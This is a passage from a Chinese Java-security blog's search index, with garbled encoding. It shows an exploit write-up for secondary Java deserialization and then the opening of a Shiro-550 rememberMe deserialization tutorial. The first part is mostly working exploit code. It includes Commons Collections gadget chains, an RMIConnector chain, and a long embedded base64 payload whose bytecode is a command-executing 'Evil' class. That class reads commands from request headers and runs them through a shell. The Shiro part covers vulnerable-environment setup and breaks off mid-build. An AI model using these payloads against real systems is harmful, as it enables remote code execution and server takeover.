class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factories</span> <span class="operator">=</span> c2.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factories.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factories.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(map2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠ<code>ser.bin</code>base64ä¸€ä¸‹ä¼ åˆ°<code>/stub</code></p><p><strong>Exp2</strong>(äºŒæ¬¡ååºåˆ—åŒ–)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> (RMIConnector) getObject();</span><br><span class="line"><span class="comment">//        rmiConnector.connect();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;connect&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, rmiConnector);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(rmiConnector);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;aser.bin&quot;</span>));</span><br><span class="line">        objOut.writeUTF(<span class="string">&quot;SJTU&quot;</span>);</span><br><span class="line">        objOut.writeInt(<span class="number">1896</span>);</span><br><span class="line">        objOut.writeObject(map2);</span><br><span class="line">        objOut.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:iiop:///stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAACc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABVMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAOT8r+ur4AAAA0ALkKAC8AXwoAYABhCgBgAGIIAGMKAGQAZQgAZgcAZwoABwBoBwBpCgBqAGsIAGwIAG0IAG4IAG8IAE0KAAcAcAgAcQgATgcAcgoAagBzCABQCAB0CgB1AHYKABMAdwgAeAoAEwB5CAB6CAB7CgATAHwIAH0IAH4IAH8IAIAKAAkAgQgAggcAgwoAhACFCgCEAIYKAIcAiAoAJACJCACKCgAkAIsKACQAjAgAjQgAjgcAjwcAkAEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL0V2aWw7AQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAJEBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEABjxpbml0PgEAAygpVgEAAWMBABFMamF2YS9sYW5nL0NsYXNzOwEAAW0BABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAAW8BABJMamF2YS9sYW5nL09iamVjdDsBAAJtMQEABHJlc3ABAANyZXEBAAlnZXRXcml0ZXIBAAlnZXRIZWFkZXIBAAZ3cml0ZXIBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAhjb21tYW5kcwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAtjaGFyc2V0TmFtZQEADVN0YWNrTWFwVGFibGUHAI8HAGcHAJIHAGkHAHIHAFMHAJMBAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDABCAEMHAJQMAJUAlgwAlwCYAQA8b3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlJlcXVlc3RDb250ZXh0SG9sZGVyBwCZDACaAJsBABRnZXRSZXF1ZXN0QXR0cmlidXRlcwEAD2phdmEvbGFuZy9DbGFzcwwAnACdAQAQamF2YS9sYW5nL09iamVjdAcAkgwAngCfAQBAb3JnLnNwcmluZ2ZyYW1ld29yay53ZWIuY29udGV4dC5yZXF1ZXN0LlNlcnZsZXRSZXF1ZXN0QXR0cmlidXRlcwEAC2dldFJlc3BvbnNlAQAKZ2V0UmVxdWVzdAEAHWphdmF4LnNlcnZsZXQuU2VydmxldFJlc3BvbnNlDACgAJ0BACVqYXZheC5zZXJ2bGV0Lmh0dHAuSHR0cFNlcnZsZXRSZXF1ZXN0AQAQamF2YS9sYW5nL1N0cmluZwwAoQCiAQAHb3MubmFtZQcAowwApAClDACmAKcBAAZ3aW5kb3cMAKgAqQEAA0dCSwEABVVURi04DACqAKcBAANXSU4BAAIvYwEABy9iaW4vc2gBAAItYwwAqwCsAQAHcHJpbnRsbgEAEWphdmEvdXRpbC9TY2FubmVyBwCtDACuAK8MALAAsQcAsgwAswC0DABCALUBAAJcQQwAtgC3DAC4AKcBAAVmbHVzaAEABWNsb3NlAQAQb3JnL2V4YW1wbGUvRXZpbAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQANc2V0QWNjZXNzaWJsZQEABChaKVYBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAC3RvVXBwZXJDYXNlAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0ACEALgAvAAAAAAADAAEAMAAxAAIAMgAAAD8AAAADAAAAAbEAAAACADMAAAAGAAEAAAAQADQAAAAgAAMAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAOQA6AAIAOwAAAAQAAQA8AAEAMAA9AAIAMgAAAEkAAAAEAAAAAbEAAAACADMAAAAGAAEAAAAVADQAAAAqAAQAAAABADUANgAAAAAAAQA3ADgAAQAAAAEAPgA/AAIAAAABAEAAQQADADsAAAAEAAEAPAABAEIAQwACADIAAALDAAkADQAAAXsqtwABuAACtgADEgS2AAVMKxIGA70AB7YACE0sAQO9AAm2AApOuAACtgADEgu2AAVMKxIMA70AB7YACE0rEg0DvQAHtgAIOgQsLQO9AAm2AAo6BRkELQO9AAm2AAo6BrgAArYAAxIOtgAFEg8DvQAHtgAQOge4AAK2AAMSEbYABRISBL0AB1kDEhNTtgAQOggZCAS2ABQZBwS2ABQZBxkFA70ACbYACjoJGQgZBgS9AAlZAxIVU7YACsAAEzoKBr0AEzoLEha4ABe2ABgSGbYAGpkACBIbpwAFEhw6DBIWuAAXtgAdEh62ABqZABIZCwMSFVMZCwQSH1OnAA8ZCwMSIFMZCwQSIVMZCwUZClMZCbYAIhIjBL0AB1kDEhNTtgAQGQkEvQAJWQO7ACRZuAAlGQu2ACa2ACcZDLcAKBIptgAqtgArU7YAClcZCbYAIhIsA70AB7YAEBkJA70ACbYAClcZCbYAIhItA70AB7YAEBkJA70ACbYAClexAAAAAwAzAAAAbgAbAAAAFgAEABcAEAAYABsAGQAlABoAMQAbADwAHABIAB0AUwAeAF8AHwB1ACAAkAAhAJYAIgCcACMAqQAkAL4AJQDEACYA3QAnAO0AKADzACkA/AArAQIALAEIAC4BDgAvAUoAMAFiADEBegAyADQAAACEAA0AAAF7ADUANgAAABABawBEAEUAAQAbAWAARgBHAAIAJQFWAEgASQADAEgBMwBKAEcABABTASgASwBJAAUAXwEcAEwASQAGAHUBBgBNAEcABwCQAOsATgBHAAgAqQDSAE8ASQAJAL4AvQBQAFEACgDEALcAUgBTAAsA3QCeAFQAUQAMAFUAAAA4AAT/ANkADAcAVgcAVwcAWAcAWQcAWAcAWQcAWQcAWAcAWAcAWQcAWgcAWwAAQQcAWvwAIAcAWgsAOwAAAAQAAQBcAAEAXQAAAAIAXnBxAH4ABnB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4cQB+AAZ4&quot;</span>);</span><br><span class="line">        <span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL,<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        <span class="keyword">return</span> rmiConnector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå°†æ–°ç”Ÿæˆçš„<code>ser.bin</code>è½¬ä¸ºåå…­è¿›åˆ¶</p><p><a href="https://imgse.com/i/zlp2u9"><img src="https://s1.ax1x.com/2022/11/21/zlp2u9.png" alt="zlp2u9.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> äºŒæ¬¡ååºåˆ—åŒ– </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå®‰å…¨ä¹‹è·¯--Shiro550ååºåˆ—åŒ–</title>
      <link href="/2022/10/19/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/10/19/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro550-ååºåˆ—åŒ–"><a href="#Shiro550-ååºåˆ—åŒ–" class="headerlink" title="Shiro550-ååºåˆ—åŒ–"></a>Shiro550-ååºåˆ—åŒ–</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>Apache Shiro æ˜¯ Java çš„ä¸€ä¸ªå®‰å…¨æ¡†æ¶ã€‚Shiro å¯ä»¥éå¸¸å®¹æ˜“çš„å¼€å‘å‡ºè¶³å¤Ÿå¥½çš„åº”ç”¨ï¼Œå…¶ä¸ä»…å¯ä»¥ç”¨åœ¨ JavaSE ç¯å¢ƒï¼Œä¹Ÿå¯ä»¥ç”¨åœ¨ JavaEE ç¯å¢ƒã€‚Shiro å¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆï¼šè®¤è¯ã€æˆæƒã€åŠ å¯†ã€ä¼šè¯ç®¡ç†ã€ä¸ Web é›†æˆã€ç¼“å­˜ç­‰ã€‚</p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>Shiro 550 ååºåˆ—åŒ–æ¼æ´å­˜åœ¨ç‰ˆæœ¬ï¼šshiro &lt;1.2.4ï¼Œäº§ç”ŸåŸå› æ˜¯å› ä¸ºshiroæ¥å—äº†Cookieé‡Œé¢<code>rememberMe</code>çš„å€¼ï¼Œç„¶åå»è¿›è¡ŒBase64è§£å¯†åï¼Œå†ä½¿ç”¨aeså¯†é’¥è§£å¯†åçš„æ•°æ®ï¼Œè¿›è¡Œååºåˆ—åŒ–ã€‚</p><p>æ‰€ä»¥æ„é€ è¯¥å€¼ä¸ºä¸€æ¡æ¶æ„javaååºåˆ—åŒ–é“¾ï¼Œå†å¯¹è¯¥å€¼è¿›è¡Œè¯¥å¯†é’¥aesåŠ å¯†åè¿›è¡Œbase64åŠ å¯†ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±ä¼šå»ååºåˆ—åŒ–æ‰€ä¼ å…¥çš„payloadï¼Œæ‰§è¡Œæ”»å‡»</p><p><strong>æµç¨‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è·å–rememberMeå€¼ -&gt; Base64è§£å¯† -&gt; AESè§£å¯† -&gt; è°ƒç”¨readobjectååºåˆ—åŒ–æ“ä½œ</span><br></pre></td></tr></table></figure><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>æ¼æ´ç¯å¢ƒ</strong>ï¼š<a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p><h3 id="é…ç½®ä¾èµ–"><a href="#é…ç½®ä¾èµ–" class="headerlink" title="é…ç½®ä¾èµ–"></a>é…ç½®ä¾èµ–</h3><p>ä¿®æ”¹<code>/samples/web/pom.xml</code>,æ·»åŠ <code>cc4</code>å’Œ<code>jstl</code>ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--  è¿™é‡Œéœ€è¦å°†jstlè®¾ç½®ä¸º1.2 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="é…ç½®jdk1-6"><a href="#é…ç½®jdk1-6" class="headerlink" title="é…ç½®jdk1.6"></a>é…ç½®jdk1.6</h3><p>å› ä¸ºåœ¨æ‰“åŒ…ç¼–è¯‘æ—¶éœ€åœ¨jdk1.6ç¯å¢ƒä¸‹æ‰èƒ½æ‰§è¡Œ</p><p>åœ¨IDEAå®‰è£…ç›®å½•ä¸‹æ‰¾åˆ°<code>/plugins/maven/lib/maven3/conf/toolchains.xml</code>,(jdkåŒ…çš„è·¯å¾„æ ¹æ®è‡ªå·±çš„è¿›è¡Œä¿®æ”¹)ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">toolchain</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>jdk<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">provides</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vendor</span>&gt;</span>sun<span class="tag">&lt;/<span class="name">vendor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">provides</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdkHome</span>&gt;</span>D:\jdk\jdk1.6.0_45<span class="tag">&lt;/<span class="name">jdkHome</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">toolchain</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘æ‰“åŒ…"><a href="#ç¼–è¯‘æ‰“åŒ…" class="headerlink" title="ç¼–è¯‘æ‰“åŒ…"></a>ç¼–è¯‘æ‰“åŒ…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 